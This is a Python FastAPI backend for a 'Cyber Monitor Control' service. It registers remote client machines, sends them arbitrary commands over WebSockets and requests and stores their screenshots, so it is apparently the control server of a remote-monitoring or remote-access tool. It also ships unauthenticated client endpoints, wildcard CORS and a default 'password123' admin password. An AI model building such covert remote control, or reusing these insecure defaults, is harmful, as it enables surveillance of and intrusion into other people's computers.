# backend/main.py
import os
from fastapi import FastAPI, HTTPException, Depends, WebSocket, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import List, Dict, Optional
import uvicorn
from datetime import datetime, timedelta
import secrets
import json
from supabase import create_client, Client
from dotenv import load_dotenv
import jwt
import bcrypt

# Load environment
load_dotenv()

app = FastAPI(title="Cyber Monitor Control", version="3.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
ADMIN_INITIAL_PASSWORD = os.getenv("ADMIN_INITIAL_PASSWORD", "password123")

# Initialize Supabase
supabase: Optional[Client] = None

# Security
security = HTTPBearer()

# ========== MODELS ==========
class LoginRequest(BaseModel):
    email: str
    password: str

class ClientRegister(BaseModel):
    client_id: str
    name: str
    ip_address: str
    os_info: str = "Windows"

class CommandRequest(BaseModel):
    client_id: str
    command: str
    parameters: Dict = {}

# ========== HELPER FUNCTIONS ==========
def get_supabase() -> Client:
    """Get Supabase client"""
    if supabase is None:
        raise HTTPException(
            status_code=500,
            detail="Database not initialized"
        )
    return supabase

# ========== SECURITY FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using bcrypt"""
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verify password"""
    try:
        return bcrypt.checkpw(plain_password.encode(), hashed_password.encode())
    except:
        return False

def create_jwt_token(data: dict, expires_delta: timedelta = None):
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str):
    """Verify JWT token"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.PyJWTError:
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=401,
            detail="Invalid authentication credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== DATABASE INITIALIZATION ==========
@app.on_event("startup")
async def startup_event():
    """Initialize database on startup"""
    global supabase
    
    try:
        # Validate environment variables
        if not SUPABASE_URL:
            print("❌ SUPABASE_URL must be set in environment variables")
            return
            
        if not SUPABASE_KEY:
            print("❌ SUPABASE_KEY must be set in environment variables")
            return
        
        print(f"🔗 Initializing Supabase connection...")
        
        # Initialize Supabase client
        supabase_client = create_client(SUPABASE_URL, SUPABASE_KEY)
        
        # Test connection with a simple query
        try:
            response = supabase_client.table("users").select("count", count="exact").limit(1).execute()
            print("✅ Database connection successful")
            global supabase
            supabase = supabase_client
        except Exception as e:
            print(f"❌ Database connection failed: {str(e)}")
            print("⚠️  Make sure you've created the tables using the SQL provided")
            
    except Exception as e:
        print(f"❌ Startup error: {str(e)}")
        import traceback
        traceback.print_exc()

# ========== ROUTES ==========
@app.post("/api/login")
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Check if user exists
        response = supabase.table("users") \
            .select("*") \
            .eq("email", data.email) \
            .execute()
        
        if not response.data:
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        user = response.data[0]
        
        # Verify password
        if not verify_password(data.password, user["password_hash"]):
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Check if user is active
        if not user.get("is_active", True):
            raise HTTPException(status_code=401, detail="Account disabled")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        try:
            supabase.table("users") \
                .update({"last_login": datetime.utcnow().isoformat()}) \
                .eq("id", user["id"]) \
                .execute()
        except:
            pass  # Optional update
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False)
            }
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Login error: {str(e)}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client")
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client IP from request
        if not data.ip_address:
            data.ip_address = request.client.host if request.client else "127.0.0.1"
        
        # Check if client exists
        response = supabase.table("clients") \
            .select("*") \
            .eq("client_id", data.client_id) \
            .execute()
        
        client_data = {
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "last_seen": datetime.utcnow().isoformat(),
            "online": True
        }
        
        if response.data:
            # Update existing client
            supabase.table("clients") \
                .update(client_data) \
                .eq("client_id", data.client_id) \
                .execute()
            client_id = response.data[0]["id"]
        else:
            # Create new client
            insert_response = supabase.table("clients") \
                .insert(client_data) \
                .execute()
            client_id = insert_response.data[0]["id"]
        
        # Add log entry
        try:
            supabase.table("logs").insert({
                "client_id": client_id,
                "log_type": "info",
                "message": f"Client registered: {data.name}"
            }).execute()
        except Exception as e:
            print(f"Log insertion error: {str(e)}")
        
        return {"success": True, "message": "Client registered"}
        
    except Exception as e:
        print(f"Client registration error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/clients")
async def get_clients(_: dict = Depends(authenticate_user)):
    """Get all clients"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        response = supabase.table("clients") \
            .select("*") \
            .order("last_seen", desc=True) \
            .execute()
        
        return {"success": True, "clients": response.data}
    except Exception as e:
        print(f"Get clients error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/commands")
async def get_commands(_: dict = Depends(authenticate_user), limit: int = 50):
    """Get recent commands"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        response = supabase.table("commands") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit) \
            .execute()
        
        return {"success": True, "commands": response.data}
    except Exception as e:
        print(f"Get commands error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/screenshots")
async def get_screenshots(_: dict = Depends(authenticate_user), limit: int = 10):
    """Get recent screenshots"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        response = supabase.table("screenshots") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit) \
            .execute()
        
        return {"success": True, "screenshots": response.data}
    except Exception as e:
        print(f"Get screenshots error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs")
async def get_logs(_: dict = Depends(authenticate_user), client_id: Optional[str] = None, limit: int = 100):
    """Get system logs"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        query = supabase.table("logs") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "logs": response.data}
    except Exception as e:
        print(f"Get logs error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command")
async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_res = supabase.table("commands").insert({
            "client_id": client_res.data[0]["id"],
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending"
        }).execute()
        
        # Try to send via WebSocket
        try:
            await manager.send_to_client(data.client_id, {
                "type": "command",
                "command_id": command_res.data[0]["id"],
                "command": data.command,
                "parameters": data.parameters
            })
        except Exception as e:
            print(f"WebSocket send error: {str(e)}")
        
        return {"success": True, "command_id": command_res.data[0]["id"]}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Send command error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/screenshot/{client_id}")
async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Try to send via WebSocket
        try:
            await manager.send_to_client(client_id, {
                "type": "screenshot_request"
            })
        except:
            pass
        
        return {"success": True, "message": "Screenshot request sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-screenshot")
async def upload_screenshot(client_id: str, image_data: str, _: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store screenshot
        supabase.table("screenshots").insert({
            "client_id": client_res.data[0]["id"],
            "image_data": image_data
        }).execute()
        
        return {"success": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.client_connections: Dict[str, WebSocket] = {}

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections["admin"] = websocket

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket

    def disconnect(self, client_id: str):
        if client_id in self.active_connections:
            del self.active_connections[client_id]
        if client_id in self.client_connections:
            del self.client_connections[client_id]

    async def send_to_admin(self, message: dict):
        if "admin" in self.active_connections:
            await self.active_connections["admin"].send_json(message)

    async def send_to_client(self, client_id: str, message: dict):
        if client_id in self.client_connections:
            await self.client_connections[client_id].send_json(message)

manager = ConnectionManager()

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            print(f"Admin WebSocket message: {data}")
    except Exception as e:
        print(f"Admin WebSocket error: {str(e)}")
        manager.disconnect("admin")

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await manager.connect_client(websocket, client_id)
    try:
        # Update client status
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat()
                }).eq("client_id", client_id).execute()
            except:
                pass
        
        while True:
            data = await websocket.receive_json()
            
            if data.get("type") == "heartbeat":
                # Update last seen
                if supabase:
                    try:
                        supabase.table("clients").update({
                            "last_seen": datetime.utcnow().isoformat(),
                            "online": True
                        }).eq("client_id", client_id).execute()
                    except:
                        pass
                
            elif data.get("type") == "command_result":
                # Update command status
                if supabase:
                    try:
                        supabase.table("commands").update({
                            "status": "completed",
                            "result": data.get("result"),
                            "completed_at": datetime.utcnow().isoformat()
                        }).eq("id", data.get("command_id")).execute()
                    except:
                        pass
                
            elif data.get("type") == "log":
                # Store log
                if supabase:
                    try:
                        client_res = supabase.table("clients") \
                            .select("id") \
                            .eq("client_id", client_id) \
                            .execute()
                        if client_res.data:
                            supabase.table("logs").insert({
                                "client_id": client_res.data[0]["id"],
                                "log_type": data.get("log_type", "info"),
                                "message": data.get("message", "")
                            }).execute()
                    except:
                        pass
                    
    except Exception as e:
        print(f"Client WebSocket error: {str(e)}")
        # Mark client as offline
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": False
                }).eq("client_id", client_id).execute()
            except:
                pass
        manager.disconnect(client_id)

@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    health_status = {
        "status": "healthy" if supabase else "unhealthy",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "3.0",
        "database": "connected" if supabase else "disconnected"
    }
    
    # Test database connection if available
    if supabase:
        try:
            supabase.table("users").select("count", count="exact").limit(1).execute()
            health_status["database"] = "connected"
        except Exception as e:
            health_status["database"] = f"error: {str(e)}"
            health_status["status"] = "degraded"
    
    return health_status

@app.get("/")
async def root():
    return {
        "message": "Cyber Monitor Control API",
        "version": "3.0",
        "docs": "/docs",
        "health": "/api/health",
        "database": "initialized" if supabase else "not initialized"
    }

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    print(f"🚀 Starting server on port {port}")
    print(f"🔗 Supabase URL: {SUPABASE_URL}")
    print(f"🔑 JWT Secret: {'Set' if JWT_SECRET_KEY else 'Not set'}")
    print(f"👑 Admin Password: {'Set' if ADMIN_INITIAL_PASSWORD else 'Using default'}")
    print("\n📋 Available endpoints:")
    print(f"   • Login: POST /api/login")
    print(f"   • Clients: GET /api/clients")
    print(f"   • Health: GET /api/health")
    print(f"   • Docs: http://localhost:{port}/docs")
    
    uvicorn.run(app, host="0.0.0.0", port=port)
